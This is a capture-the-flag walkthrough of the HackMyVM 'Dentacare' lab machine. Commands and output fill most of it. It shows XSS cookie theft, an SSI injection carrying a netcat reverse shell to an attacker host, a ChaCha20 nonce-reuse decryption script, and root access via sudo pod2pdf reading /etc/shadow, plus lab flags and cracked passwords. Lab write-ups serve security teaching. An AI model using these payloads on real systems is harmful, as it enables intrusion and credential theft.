# Dentacare

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.90:80
Open 10.0.2.90:22
Open 10.0.2.90:8000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.90

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=
|   256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
80/tcp   open  http    syn-ack Werkzeug httpd 3.0.2 (Python 3.11.2)
|_http-server-header: Werkzeug/3.0.2 Python/3.11.2
|_http-title: DentaCare Corporation
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
8000/tcp open  http    syn-ack Apache httpd 2.4.57
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/dentacare/writeup.png)

```bash
â””â”€$ feroxbuster -u http://dentacare.hmv -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET        7l      287w    43237c http://dentacare.hmv/static/js/owl.carousel.min.js
200      GET      288l      569w     6179c http://dentacare.hmv/static/js/main.js
200      GET       62l      191w     1946c http://dentacare.hmv/static/js/google-map.js
200      GET       32l      239w     7447c http://dentacare.hmv/static/js/scrollax.min.js
200      GET        7l      152w     8835c http://dentacare.hmv/static/js/jquery.waypoints.min.js
200      GET      249l      706w    11918c http://dentacare.hmv/post-comment
200      GET        4l      212w    20216c http://dentacare.hmv/static/js/jquery.magnific-popup.min.js
200      GET        7l      285w    15764c http://dentacare.hmv/static/js/jquery.timepicker.min.js
200      GET      420l     1502w    23021c http://dentacare.hmv/blog
200      GET      494l     1498w    24697c http://dentacare.hmv/doctors
200      GET        7l      570w    50676c http://dentacare.hmv/static/js/bootstrap.min.js
200      GET        2l       72w    12597c http://dentacare.hmv/static/js/jquery.stellar.min.js
200      GET      205l     1368w     8111c http://dentacare.hmv/static/js/jquery.easing.1.3.js
200      GET      890l     2879w    43069c http://dentacare.hmv/index.html
200      GET      215l     1394w    11421c http://dentacare.hmv/static/js/jquery-migrate-3.0.1.min.js
200      GET      438l     1383w    21296c http://dentacare.hmv/services
200      GET        8l       28w     1391c http://dentacare.hmv/static/js/jquery.animateNumber.min.js
200      GET    10253l    40950w   268038c http://dentacare.hmv/static/js/jquery.min.js
200      GET     1671l     4509w    46820c http://dentacare.hmv/static/js/bootstrap-datepicker.js
200      GET        5l      347w    19032c http://dentacare.hmv/static/js/popper.min.js
200      GET        2l      284w    14244c http://dentacare.hmv/static/js/aos.js
200      GET      441l     1538w    22975c http://dentacare.hmv/about
200      GET      890l     2879w    43069c http://dentacare.hmv/
302      GET        5l       22w      189c http://dentacare.hmv/admin => http://dentacare.hmv/
405      GET        5l       20w      153c http://dentacare.hmv/comment
200      GET       45l      144w     1563c http://dentacare.hmv/console
```

Flask is running in Debug mode

![writeup-1.png](/assets/pentest/hackmyvm/dentacare/writeup-1.png)

### XSS

On [http://dentacare.hmv/comment](http://dentacare.hmv/comment) we are able to leave feedback. First I tried SSTI, but no luck since there's no output to see. Then I tried XSS, after some time I got callback.

```bash
â””â”€$ dirtypipe 80
Server on port 80...
--- Request at 2025-10-29 18:43:06 ---
Client: 10.0.2.90:38494
Method: GET
Path: /
Query Params:
  Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJEZW50YUNhcmUgQ29ycG9yYXRpb24gIiwiaWF0IjoxNzEyNTc0NTEyLCJleHAiOjE3NDQxMTA1MTIsImF1ZCI6ImRlbnRhY2FyZS5obXYiLCJzdWIiOiJoZWxwZGVza0BkZW50YWNhcmUuaG12IiwiR2l2ZW5OYW1lIjoiUGF0cmljayIsIlN1cm5hbWUiOiJQZXRpdCIsIkVtYWlsIjoiYWRtaW5AZGVudGFjYXJlLmhtdiIsIlJvbGUiOlsiQWRtaW5pc3RyYXRvciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.FIMxmUCOL3a4ThN5z-7VDN8OxBK7W0krHlcVktAiZtx3KXSQsbno1q1MRUL9JMPTJeqoTr-bRL2KWyr5Kv7JnQ
Headers:
  Host: 10.0.2.15
  Connection: keep-alive
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/123.0.0.0 Safari/537.36
  Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
  Referer: http://localhost/
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
==================================================
```

![writeup-2.png](/assets/pentest/hackmyvm/dentacare/writeup-2.png)

## HTTP (8000)

We are able to use the Authorization header value as Cookie to login into port 8000 application
```bash
â””â”€$ curl 'http://dentacare.hmv:8000/' -H "Authorization: $(cat cookie)" | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   280  100   280    0     0  21943      0 --:--:-- --:--:-- --:--:-- 23333
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.57 (Debian) Server at dentacare.hmv Port 8000</address>
</body></html>

â”Œâ”€â”€(woyagã‰¿kraken)-[~/Desktop/Rooms/HackMyVM/Dentacare]
â””â”€$ curl 'http://dentacare.hmv:8000/' -b "Authorization=$(cat cookie)" | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   352    0   352    0     0  55740      0 --:--:-- --:--:-- --:--:-- 70400
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h1>Wednesday, 29-Oct-2025 20:01:53 CET</h1>
    <h2>Accounts Receivable Management Portal</h2>
    <form action="gen.php" method="get">
       <input type="text" name="cmd" placeholder="Name of debtor patient ">
```

![writeup-3.png](/assets/pentest/hackmyvm/dentacare/writeup-3.png)

![writeup-4.png](/assets/pentest/hackmyvm/dentacare/writeup-4.png)

### SSI

The `shtml` is odd to see
- [Server Side Inclusion/Edge Side Inclusion Injection](https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html#server-side-inclusionedge-side-inclusion-injection)

```bash
â””â”€$ curl 'http://dentacare.hmv:8000/gen.php' -b "Authorization=$(cat cookie)" -G --data-urlencode 'cmd=<!--#exec cmd="ls -alh" -->' -Ls
<html><body><h1>Patient with unpaid balance added to database :</h1>"total 28K
drwxr-xr-x 2 www-data www-data 4.0K Apr 14  2024 .
drwxr-xr-x 3 root     root     4.0K Apr  9  2024 ..
-rw-r--r-- 1 root     root      537 Apr 14  2024 .htaccess
-rw-r--r-- 1 www-data www-data  268 Apr 12  2024 gen.php
-rw-r--r-- 1 www-data www-data  347 Apr 12  2024 index.shtml
-rw-r--r-- 1 www-data www-data  111 Oct 29 20:08 patient_name.shtml
-rw-r--r-- 1 www-data www-data   95 Apr 12  2024 process.php
"</body></html> 
```

### Reverse Shell

```bash
â””â”€$ curl 'http://dentacare.hmv:8000/gen.php' -b "Authorization=$(cat cookie)" -G --data-urlencode 'cmd=<!--#exec cmd="busybox nc 10.0.2.15 4444 -e /bin/bash"-->' -Ls
---
â””â”€$ pwncat-cs -lp 4444
[15:10:50] Welcome to pwncat ðŸˆ!                        
[15:11:06] received connection from 10.0.2.90:41418     
[15:11:07] 10.0.2.90:41418: registered new host w/ db   
(local) pwncat$
(remote) www-data@dentacare:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
(remote) www-data@dentacare:/opt/appli$ ls -alh /opt/
total 16K
drwxr-xr-x  4 root     root     4.0K Apr 12  2024 .
drwxr-xr-x 18 root     root     4.0K Mar  9  2024 ..
drwxr-xr-x  7 www-data www-data 4.0K Oct 29 20:00 appli
drwxr-xr-x  3 dentist  dentist  4.0K Apr 12  2024 carries

(remote) www-data@dentacare:/opt/carries$ ls -alh
total 24K
drwxr-xr-x 3 dentist dentist 4.0K Apr 12  2024 .
drwxr-xr-x 4 root    root    4.0K Apr 12  2024 ..
drwxr-xr-x 5 root    root    4.0K Apr 12  2024 .env
-rwxr--r-- 1 dentist dentist 1.1K Apr 12  2024 crypted_potion.txt
-rwxr-xr-x 1 dentist dentist  923 Apr 12  2024 farewell_the_carries.py
-rw------- 1 dentist dentist  357 Apr 12  2024 potion.txt

(remote) www-data@dentacare:/opt/carries$ cat crypted_potion.txt ;echo
58b8839c52139a58f4f2d5265fb67a85ebd48c52b430823e
a12c2cd43e39b0651ee7a65dd19cdf0eeacf472286368c8edc5efaf6530672727c6d80cc495485dfd4590371ab701388dac27c3993b3776f92ade39492b240596eeb134589ee63334d870545786ababd41e569dd19e46c16176d64d98f0e2e21e255dd5029be93124fddb99f5e1df45766ccb10b777f710adbf0b51ac5a5a83fa07f32b39573ecfc7eaa22140fd00e531308fdfb591403a446751c724e11ccc40c6464374185325742d976b98b0f185c0e5c6e
a92478dc3539a5610bf0a6099991de04fbc00b6b897a829f995fe2b41a5e4b307861cdcd484e93d39d6405278f70138ccfcc7a3cdfe77c65dcbde59a96b74a172bf91d419eba6f37498d09556a3eb0a841e469c019fe6253172266d7dd1c3130f855c1593fbe9c0e59c7f09e4d14a3576c88e33c6c7f724bc6f3b510dfb9e92ca06922b68e31b9c964e52d1414db5d421a12a5b20d2505b8183b10673d1ac0c40539232501cb7a035d9872f89b12035d500f2e428fd9de94cef5fba1bc03cd8779dc7c77d7c53cd07ecc13fe53a36bc2e0d8ff2df960450f61861af42bd6acc7748cebbf29578e30948538158caa59b1dbbc1dfc27517485f504f47b41f27e211ae6f02f0f4d9b406627698344a8773e71bc68ef2515a004c8a7cad09cc0fc6518823ae224d46a00f547e7d85a4348aed1bf24ebbda605338178cfb7b0a4d02add39eebb589d6089259072a734935b8a9f4f4d8fbca8a611785735f8776bd69c6b1256c7a8
```

```python
from Crypto.Cipher import ChaCha20
import os

def encryptMessage(message, key, nonce):
    cipher = ChaCha20.new(key=key, nonce=nonce)
    ciphertext = cipher.encrypt(message)
    return ciphertext

def writeData(data):
    with open("crypted_potion.txt", "w") as f:
        f.write(data)

def readFlagFromFile(filename="potion.txt"):
    with open(filename, "rb") as f:
        return f.read()

if __name__ == "__main__":
    message = b"After years hidden in my lab, I've done it! A magical concoction "
    message += b"that eradicates cavities forever has been brewed! Prepare for a "
    message += b"revolution in dentistry, my fellow tooth warriors!"

    key, iv = os.urandom(32), os.urandom(24)

    flag = readFlagFromFile()

    announcement = encryptMessage(message, key, iv)
    potion = encryptMessage(flag, key, iv)

    data = iv.hex() + "\n" + announcement.hex() + "\n" + potion.hex()
    writeData(data)
```

Reverse the weak encryption:
```python
def xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

message = (
    b"After years hidden in my lab, I've done it! A magical concoction "
    b"that eradicates cavities forever has been brewed! Prepare for a "
    b"revolution in dentistry, my fellow tooth warriors!"
)
 
iv = bytes.fromhex('58b8839c52139a58f4f2d5265fb67a85ebd48c52b430823e')
announcement = bytes.fromhex('a12c2cd43e39b0651ee7a65dd19cdf0eeacf472286368c8edc5efaf6530672727c6d80cc495485dfd4590371ab701388dac27c3993b3776f92ade39492b240596eeb134589ee63334d870545786ababd41e569dd19e46c16176d64d98f0e2e21e255dd5029be93124fddb99f5e1df45766ccb10b777f710adbf0b51ac5a5a83fa07f32b39573ecfc7eaa22140fd00e531308fdfb591403a446751c724e11ccc40c6464374185325742d976b98b0f185c0e5c6e')
potion = bytes.fromhex('a92478dc3539a5610bf0a6099991de04fbc00b6b897a829f995fe2b41a5e4b307861cdcd484e93d39d6405278f70138ccfcc7a3cdfe77c65dcbde59a96b74a172bf91d419eba6f37498d09556a3eb0a841e469c019fe6253172266d7dd1c3130f855c1593fbe9c0e59c7f09e4d14a3576c88e33c6c7f724bc6f3b510dfb9e92ca06922b68e31b9c964e52d1414db5d421a12a5b20d2505b8183b10673d1ac0c40539232501cb7a035d9872f89b12035d500f2e428fd9de94cef5fba1bc03cd8779dc7c77d7c53cd07ecc13fe53a36bc2e0d8ff2df960450f61861af42bd6acc7748cebbf29578e30948538158caa59b1dbbc1dfc27517485f504f47b41f27e211ae6f02f0f4d9b406627698344a8773e71bc68ef2515a004c8a7cad09cc0fc6518823ae224d46a00f547e7d85a4348aed1bf24ebbda605338178cfb7b0a4d02add39eebb589d6089259072a734935b8a9f4f4d8fbca8a611785735f8776bd69c6b1256c7a8')

# compute the overlap region
minlen = min(len(announcement), len(potion), len(message))
print(f"Announcement ciphertext len:    {len(announcement)}")
print(f"Potion ciphertext len:          {len(potion)}")
print(f"Message (known) len:            {len(message)}")
print(f"Overlap used for full recovery: {minlen} bytes")

# derive keystream portion from announcement
keystream_part = xor(announcement[:minlen], message[:minlen])

# decrypt potion portion (only up to minlen)
recovered_part = xor(keystream_part, potion[:minlen])

print("\nRecovered potion:")
print(recovered_part.decode('utf-8'))
```

```bash
Announcement ciphertext len:    179
Potion ciphertext len:          357
Message (known) len:            179
Overlap used for full recovery: 179 bytes

Recovered potion:
In my latest dental alchemy experiments, I've merged the simple effectiveness of baking soda with the mystical energies of lunar dust. As a result, 'EternalSmile2024!' was born, a
```

::: tip Creds
`dentist:EternalSmile2024!`
:::

## SSH

```bash
â””â”€$ sshpass -p 'EternalSmile2024!' ssh dentist@10.0.2.90
dentist@dentacare:~$ id
uid=1000(dentist) gid=1000(dentist) groups=1000(dentist),100(users)
```

### User.txt

```bash
dentist@dentacare:~$ cat user.txt
ef2f3bab2950c28547e17d32f864f172
```

## Privilege Escalation

```bash
dentist@dentacare:~$ sudo -l
Matching Defaults entries for dentist on dentacare:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dentist may run the following commands on dentacare:
    (ALL : ALL) NOPASSWD: /usr/bin/pod2pdf
```

I wanted to make `O</etc/passwd>` work, but docs says: `pod2pdf supports the file types JPG, GIF, TIFF, PNG, and PNM for embedded objects.`
- [https://metacpan.org/dist/pod2pdf/view/bin/pod2pdf](https://metacpan.org/dist/pod2pdf/view/bin/pod2pdf)

```bash
dentist@dentacare:~$ sudo /usr/bin/pod2pdf @/etc/shadow
Use of uninitialized value in multiplication (*) at /usr/bin/pod2pdf line 94, <OPT> line 24.
Can't open root:$6$oVM8onySfQyyGID/$7TWQ22OZhZJGE.zsxTKtIj/uyEoUmxc.SCYaghAfbM6VUqQVcenX9DQCO2szyJp9iT5fHoGQVb4eeG7rYq9fQ.:19826:0:99999:7::: for reading: No such file or directory
 at /usr/bin/pod2pdf line 115.
```

```bash
âžœ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
sabertooth       (root)
```

::: tip Creds
`root:sabertooth`
:::

```bash
dentist@dentacare:~$ su -
Password: sabertooth
root@dentacare:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@dentacare:~# cat /root/r00t.txt
31b80e67e233ed342639f36b10ecb64d
```

## P.S.

There were alternative ways of exploitation! Amazing.
- Exploited Cronjob: [https://pepster.me/hackmyvm-dentacare-walkthrough](https://pepster.me/hackmyvm-dentacare-walkthrough)
- Kernel Exploit: [https://blog.csdn.net/tanbinn/article/details/139753433](https://blog.csdn.net/tanbinn/article/details/139753433)